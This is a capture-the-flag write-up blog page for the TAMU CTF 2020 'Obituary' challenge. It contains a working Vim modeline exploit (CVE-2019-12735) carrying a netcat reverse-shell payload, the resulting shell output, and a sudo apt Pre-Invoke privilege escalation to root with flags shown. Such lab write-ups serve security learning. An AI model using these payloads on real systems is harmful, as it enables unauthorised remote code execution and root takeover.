@@ -1,0 +1,1183 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+
+    <title>[EN] [CTF] TAMU - Obituary :: vonKrafft.fr</title>
+
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+
+    <link rel="shortcut icon" href='/img/favicon.png' type="image/png" />
+    <link rel="apple-touch-icon" href='/img/apple-touch-icon.png' />
+    <link rel="apple-touch-icon" sizes="57x57" href='/img/apple-touch-icon-57x57.png' />
+    <link rel="apple-touch-icon" sizes="72x72" href='/img/apple-touch-icon-72x72.png' />
+    <link rel="apple-touch-icon" sizes="76x76" href='/img/apple-touch-icon-76x76.png' />
+    <link rel="apple-touch-icon" sizes="114x114" href='/img/apple-touch-icon-114x114.png' />
+    <link rel="apple-touch-icon" sizes="120x120" href='/img/apple-touch-icon-120x120.png' />
+    <link rel="apple-touch-icon" sizes="144x144" href='/img/apple-touch-icon-144x144.png' />
+    <link rel="apple-touch-icon" sizes="152x152" href='/img/apple-touch-icon-152x152.png' />
+    <link rel="apple-touch-icon" sizes="180x180" href='/img/apple-touch-icon-180x180.png' />
+
+    <link rel="canonical" href="/write-up/ctf-tamu-obituary-500/" />
+    <link rel="alternative" href="/index.xml" title="vonKrafft" type="application/atom+xml" />
+
+    <meta name="renderer" content="webkit" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="format-detection" content="telephone=no,email=no,adress=no" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+
+    <meta name="robots" content="index,follow" />
+    
+    
+
+    
+
+        <meta name="author" content='' />
+        <meta name="description" content="Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you&amp;rsquo;re ready. You&amp;rsquo;re using vim, right? You should use it; it&amp;rsquo;ll change your life. I basically depend on it for everything these days!
+NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.
+ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  client nobind dev tap remote-cert-tls server float explicit-exit-notify remote obituary." />
+
+        
+            <meta name="twitter:card" content="summary_large_image" />
+            <meta name="twitter:image" content="https://vonkrafft.fr/media/2020/03/f7e59c09e1d415108b97139ba3306e77.png" />
+        
+
+        <meta name="twitter:site" content="@" />
+        <meta name="twitter:title" content="[EN] [CTF] TAMU - Obituary" />
+        <meta name="twitter:description" content="Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you&amp;rsquo;re ready. You&amp;rsquo;re using vim, right? You should use it; it&amp;rsquo;ll change your life. I basically depend on it for everything these days!
+NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.
+ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  client nobind dev tap remote-cert-tls server float explicit-exit-notify remote obituary." />
+
+    
+
+    <link rel="stylesheet" href='/css/highlight-github.min.css'>
+    <link rel="stylesheet" href='/css/raleway.css'>
+    <link rel="stylesheet" href='/css/sourcesanspro.css'>
+    <link rel="stylesheet" href='/css/font-awesome.min.css'>
+    <link rel="stylesheet" href='/css/jquery.fancybox.min.css'>
+    <link rel="stylesheet" href='/css/main.css'>
+    <link rel="stylesheet" href='/css/academicons.min.css'>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-24449159-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+</head>
+<body>
+
+    
+    <div id="wrapper">
+
+    
+    
+<header id="header">
+    <h1><a href="/">vonKrafft</a></h1>
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/securite/">
+                            <i class="fa fa-lock">&nbsp;</i>Sécurité
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/console/">
+                            <i class="fa fa-code">&nbsp;</i>Console
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/actus/">
+                            <i class="fa fa-newspaper-o">&nbsp;</i>Actus
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/dossiers/">
+                            <i class="fa fa-book">&nbsp;</i>Dossiers
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/guides/">
+                            <i class="fa fa-laptop">&nbsp;</i>Guides
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tutoriels/">
+                            <i class="fa fa-flask">&nbsp;</i>Tuto
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/works/">
+                            <i class="fa fa-rocket">&nbsp;</i>Works
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/contact/">
+                            <i class="fa fa-id-card-o">&nbsp;</i>Contact
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/securite/">
+                            <h3>
+                                <i class="fa fa-lock">&nbsp;</i>Sécurité
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/console/">
+                            <h3>
+                                <i class="fa fa-code">&nbsp;</i>Console
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/actus/">
+                            <h3>
+                                <i class="fa fa-newspaper-o">&nbsp;</i>Actus
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/dossiers/">
+                            <h3>
+                                <i class="fa fa-book">&nbsp;</i>Dossiers
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/guides/">
+                            <h3>
+                                <i class="fa fa-laptop">&nbsp;</i>Guides
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tutoriels/">
+                            <h3>
+                                <i class="fa fa-flask">&nbsp;</i>Tuto
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/works/">
+                            <h3>
+                                <i class="fa fa-rocket">&nbsp;</i>Works
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/contact/">
+                            <h3>
+                                <i class="fa fa-id-card-o">&nbsp;</i>Contact
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/write-up/ctf-tamu-obituary-500/">[EN] [CTF] TAMU - Obituary</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-03-30'>
+                                    30 mars 2020</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/tutoriels/prises-conectees-sonoff-tasmota/">Des prises connectées Sonoff avec Tasmota</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-03-29'>
+                                    29 mars 2020</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/write-up/ctf-esgi-my-name-is-rookie-350/">[CTF] ESGI - My Name is Rookie</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-04-07'>
+                                    7 avril 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/console/serveur-web-docker-nginx-php-postgres/">Serveur Web avec Docker : Nginx, PHP et PostgreSQL</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-03-18'>
+                                    18 mars 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/guides/installer-python-3.7-debian-9-strecth/">Installer Python 3.7 sur Debian 9 Stretch</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-03-04'>
+                                    4 mars 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /page/2
+                        
+                        class="button">Voir plus d'articles</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fwrite-up%2fctf-tamu-obituary-500%2f&amp;text=%5bEN%5d%20%5bCTF%5d%20TAMU%20-%20Obituary&amp;via=v0nkrafft" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+<li>
+  <a href="//plus.google.com/share?url=%2fwrite-up%2fctf-tamu-obituary-500%2f" target="_blank" class="share-btn google-plus">
+    <i class="fa fa-google-plus"></i>
+    <p>Google+</p>
+  </a>
+</li>
+
+
+
+
+
+<li>
+  <a href="//www.facebook.com/sharer/sharer.php?u=%2fwrite-up%2fctf-tamu-obituary-500%2f" target="_blank" class="share-btn facebook">
+    <i class="fa fa-facebook"></i>
+    <p>Facebook</p>
+    </a>
+</li>
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fwrite-up%2fctf-tamu-obituary-500%2f&amp;title=%5bEN%5d%20%5bCTF%5d%20TAMU%20-%20Obituary" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fwrite-up%2fctf-tamu-obituary-500%2f&amp;title=%5bEN%5d%20%5bCTF%5d%20TAMU%20-%20Obituary" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.stumbleupon.com/submit?url=%2fwrite-up%2fctf-tamu-obituary-500%2f&amp;title=%5bEN%5d%20%5bCTF%5d%20TAMU%20-%20Obituary" target="_blank" class="share-btn stumbleupon">
+    <i class="fa fa-stumbleupon"></i>
+    <p>StumbleUpon</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.pinterest.com/pin/create/button/?url=%2fwrite-up%2fctf-tamu-obituary-500%2f&amp;description=%5bEN%5d%20%5bCTF%5d%20TAMU%20-%20Obituary" target="_blank" class="share-btn pinterest">
+    <i class="fa fa-pinterest-p"></i>
+    <p>Pinterest</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="mailto:?subject=Check out this post by &amp;body=%2fwrite-up%2fctf-tamu-obituary-500%2f" target="_blank" class="share-btn email">
+    <i class="fa fa-envelope"></i>
+    <p>Email</p>
+  </a>
+</li>
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="cover" style="background-image: url(/media/2020/03/f7e59c09e1d415108b97139ba3306e77.png)"></div>
+    <div class="title">
+        
+            <h1><a href="/write-up/ctf-tamu-obituary-500/">[EN] [CTF] TAMU - Obituary</a></h1>
+            
+        
+        
+            <p>Write-up for challenge &#39;Obituary&#39; (Network Pentest, 2 × 500 pts) from TAMU CTF 2020.</p>
+        
+    </div>
+    <div class="meta meta-write-up">
+        
+
+        <time class="published"
+            datetime='2020-03-30'>
+            30 mars 2020</time>
+        <span class="author"></span>
+
+        
+            <p>4 minutes de lecture</p>
+        
+    </div>
+</header>
+
+
+  
+
+  
+
+  <div id="content">
+    <blockquote>
+<p>Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you&rsquo;re ready. You&rsquo;re using vim, right? You should use it; it&rsquo;ll change your life. I basically depend on it for everything these days!</p>
+<p>NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-plaintext" data-lang="plaintext">client
+nobind
+dev tap
+remote-cert-tls server
+float
+explicit-exit-notify
+
+remote obituary.naum.tamuctf.com 2005 udp
+
+&lt;key&gt;[...]&lt;/key&gt;
+&lt;cert&gt;[...]&lt;/cert&gt;
+&lt;ca&gt;[...]&lt;/ca&gt;
+key-direction 1
+
+cipher AES-256-CBC
+auth SHA256
+comp-lzo</code></pre></td></tr></table>
+</div>
+</div>
+<p>Once the VPN connection is established, we can see that the <code>172.30.0.2</code> server exposes a service on port 4321. It is therefore on this port that we will send our files. The challenge description mentioning the use of vim, we suspect that the exploitation of a possible flaw in the text editor will allow us to execute code remotely.</p>
+<p>This is precisely what the <strong>CVE-2019–12735</strong> allows! The flaw resides in the way how the text editor handles the &ldquo;modelines&rdquo; a feature that’s enabled by default to automatically find and apply a set of custom preferences as mentioned by the creator of a file at the starting and ending lines in a document. Therefore, just opening an innocent looking specially crafted malicious file using <strong>Vim</strong> or <strong>Neovim</strong> editor could allow attackers to execute commands on Linux system and ultimately take over the target system.</p>
+<p>We need to suppose the server uses Vim before version 8.1.1365 and has the modeline option enabled, but it is easy to check it. First, we need to craft a malicious file with our payload :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">$ cat revshell.txt
+:!nc -nv 172.30.0.14 <span class="m">4444</span> -e /bin/sh <span class="o">||</span><span class="s2">&#34; vi:fen:fdm=expr:fde=assert_fails(&#34;</span>source<span class="se">\!\ \%</span><span class="s2">&#34;):fdl=0:fdt=&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>When this file is opened by the vulnerable Vim, if will offer us a reverse shell on the server. All we have to do is open port 4444 for listening and send the file with <code>cat revshell.txt | nc 172.30.0.2 4321</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">$ nc -nlvp <span class="m">4444</span>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 2, port 4444<span class="o">)</span>
+Connection from 172.30.0.2 <span class="m">55610</span> received!
+
+&gt; id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>mwazowski<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>mwazowski<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>mwazowski<span class="o">)</span>
+
+&gt; ls -l /home/mwazowski
+total <span class="m">12</span>
+-rw-rw-r-- <span class="m">1</span> root root  <span class="m">28</span> Mar <span class="m">19</span> 00:40 flag.txt
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">96</span> Mar <span class="m">21</span> 08:04 manually_installed_packages.txt
+-rw-rw-r-- <span class="m">1</span> root root <span class="m">342</span> Mar <span class="m">19</span> 00:40 note_to_self.txt
+
+&gt; cat /home/mwazowski/flag.txt
+gigem<span class="o">{</span>ca7_1s7_t0_mak3_suRe<span class="o">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>gigem{ca7_1s7_t0_mak3_suRe}</p>
+</blockquote>
+<p>As stated above, the user &ldquo;mwazoski&rdquo; owns the first flag and root owns the second one. So we need to elevate our privileges. In our home directory, we can see two other files: <code>manually_installed_packages.txt</code> and <code>note_to_self.txt</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">mwazowski@172.30.0.2:~$ cat /home/mwazowski/manually_installed_packages.txt
+Apparently my packages are out of date. ITSEC is really throwing a fit about me
+needing to update since red team popped my box.
+
+I<span class="err">&#39;</span>m sending them my installed packages. I have no idea how these guys got root
+on my machine, my password is like <span class="m">60</span> characters long. The only thing I have
+as nopasswd is apt, which I just use <span class="k">for</span> updates anyway.
+
+mwazowski@172.30.0.2:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> mwazowski on 72db72483a28:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User mwazowski may run the following commands on 72db72483a28:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/apt</code></pre></td></tr></table>
+</div>
+</div>
+<p>We can see here, the user &ldquo;mwazowski&rdquo; is only allowed to execute the command <code>apt</code> to allow him to perform updates on the machine. At least this was the intention&hellip;</p>
+<p>If we look at the very bottom, we will notice that there is an <code>--option</code> flag that can be passed into <code>apt</code>. This allows us to set an “arbitrary configuration option”. In digging into the documentation further, I come across a series of configuration items available to the options parameter of the following kind.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">$ man apt-get
+<span class="o">[</span>...<span class="o">]</span>
+-o, --option
+    Set a Configuration Option. This will <span class="nb">set</span> an arbitrary configuration option. The syntax is -o Foo::Bar<span class="o">=</span>bar.
+<span class="o">[</span>...<span class="o">]</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>From here, all we need to do is run <code>apt update</code> with this <code>--option</code> flag :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">$ nc -nlvp <span class="m">4444</span>
+Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 2, port 4444<span class="o">)</span>
+Connection from 172.30.0.2 <span class="m">55610</span> received!
+
+&gt; id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>mwazowski<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>mwazowski<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>mwazowski<span class="o">)</span>
+
+&gt; sudo apt update -o APT::Update::Pre-Invoke::<span class="o">=</span><span class="s2">&#34;/bin/bash -i&#34;</span>
+
+&gt; id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+
+&gt; ls -l /root
+total <span class="m">4</span>
+-rw-rw-r-- <span class="m">1</span> root root <span class="m">48</span> Mar <span class="m">19</span> 00:40 flag.txt
+
+&gt; cat /root/flag.txt
+gigem<span class="o">{</span>y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r<span class="o">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}</p>
+</blockquote>
+<hr>
+<p>Sources:</p>
+<ul>
+<li><a href="https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf">https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf</a></li>
+<li><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/">https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/</a></li>
+</ul>
+
+  </div>
+
+  <footer>
+    <ul class="stats">
+  <li class="categories">
+    <ul>
+        
+            
+            
+                <i class="fa fa-folder"></i>
+                
+                
+                <li><a class="article-category-link" href="/categories/write-up">Write-up</a></li>
+                
+            
+        
+    </ul>
+  </li>
+  <li class="tags">
+    <ul>
+        
+            
+            
+                <i class="fa fa-tags"></i>
+                
+                
+                <li><a class="article-category-link" href="/tags/ctf">CTF</a></li>
+                
+                
+                <li><a class="article-category-link" href="/tags/pentest">Pentest</a></li>
+                
+                
+                <li><a class="article-category-link" href="/tags/vim">vim</a></li>
+                
+            
+        
+    </ul>
+  </li>
+</ul>
+
+  </footer>
+
+  <div class="post-copyright">
+    <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Licence Creative Commons" class="img-cc" src="/img/by-sa_4.0_80x15.png" /></a> Cet article est mis à disposition selon les termes de la <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Licence Creative Commons Attribution-ShareAlike 4.0 International</a>.
+    
+  </div>
+
+</article>
+
+    <article class="post">
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "vonkrafft" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </article>
+
+
+<ul class="actions pagination">
+    
+        <li><a href="/write-up/ctf-esgi-my-name-is-rookie-350/"
+                class="button big previous">[CTF] ESGI - My Name is Rookie</a></li>
+    
+
+    
+</ul>
+
+
+    </div>
+    
+<section id="sidebar">
+
+  
+  <section id="intro">
+    
+    
+      
+        <a href='/' class="logo"><img src="/img/avatar.jpg" alt="vonKrafft" /></a>
+      
+    
+    
+      <header>
+        <h2>vonKrafft</h2>
+        <p>Chronicles of a cybersecurity engineer</p>
+      </header>
+    
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/vonKrafft" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/wandrillekrafft" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/v0nkrafft" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="mailto:contact%20at%20vonkrafft.fr" title="Email" class="fa fa-envelope"></a></li>
+
+
+      </ul>
+    
+  </section>
+
+  
+  <section class="recent-posts">
+    <div class="mini-posts">
+      <header>
+        <h3>Articles Récents</h3>
+      </header>
+      <div class="posts-container">
+        
+
+        
+          
+        
+
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/write-up/ctf-tamu-obituary-500/">[EN] [CTF] TAMU - Obituary</a>
+              </h3>
+              
+              <time class="published" datetime='2020-03-30'>
+                30 mars 2020
+              </time>
+            </header>
+            <a href="/write-up/ctf-tamu-obituary-500/" class="image"><img src="/media/2020/03/f7e59c09e1d415108b97139ba3306e77.png" alt=""></a>
+            
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/tutoriels/prises-conectees-sonoff-tasmota/">Des prises connectées Sonoff avec Tasmota</a>
+              </h3>
+              
+              <time class="published" datetime='2020-03-29'>
+                29 mars 2020
+              </time>
+            </header>
+            <a href="/tutoriels/prises-conectees-sonoff-tasmota/" class="image"><img src="/media/2020/03/a6c629a0985665748bfb63318a02a126.png" alt=""></a>
+            
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/write-up/ctf-esgi-my-name-is-rookie-350/">[CTF] ESGI - My Name is Rookie</a>
+              </h3>
+              
+              <time class="published" datetime='2019-04-07'>
+                7 avril 2019
+              </time>
+            </header>
+            <a href="/write-up/ctf-esgi-my-name-is-rookie-350/" class="image"><img src="/media/2019/04/521d3bc39a409ad016ea111cc08c63cb.png" alt=""></a>
+            
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/console/serveur-web-docker-nginx-php-postgres/">Serveur Web avec Docker : Nginx, PHP et PostgreSQL</a>
+              </h3>
+              
+              <time class="published" datetime='2019-03-18'>
+                18 mars 2019
+              </time>
+            </header>
+            <a href="/console/serveur-web-docker-nginx-php-postgres/" class="image"><img src="/media/2019/03/bff132734906900fcbf309071ae72229.png" alt=""></a>
+            
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/guides/installer-python-3.7-debian-9-strecth/">Installer Python 3.7 sur Debian 9 Stretch</a>
+              </h3>
+              
+              <time class="published" datetime='2019-03-04'>
+                4 mars 2019
+              </time>
+            </header>
+            <a href="/guides/installer-python-3.7-debian-9-strecth/" class="image"><img src="/media/2019/03/23eeeb4347bdd26bfc6b7ee9a3b755dd.png" alt=""></a>
+            
+
+          </article>
+        
+      </div>
+
+      
+        <a href=
+          
+            /page/2
+          
+        class="button">Voir plus d'articles</a>
+      
+    </div>
+  </section>
+
+  
+  
+  
+  
+  
+    <section id="categories">
+      <header>
+        <h3>
+          <a href="/categories/">Catégories</a>
+        </h3>
+      </header>
+        
+          
+        
+
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/actus/">actus</a>
+                <span style="float:right;">16</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/guides/">guides</a>
+                <span style="float:right;">13</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/tutoriels/">tutoriels</a>
+                <span style="float:right;">12</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/dossiers/">dossiers</a>
+                <span style="float:right;">11</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/console/">console</a>
+                <span style="float:right;">8</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/write-up/">write-up</a>
+                <span style="float:right;">5</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/securite/">securite</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+    </section>
+  
+  
+
+  
+  
+
+  
+  <section id="footer">
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/vonKrafft" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/wandrillekrafft" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
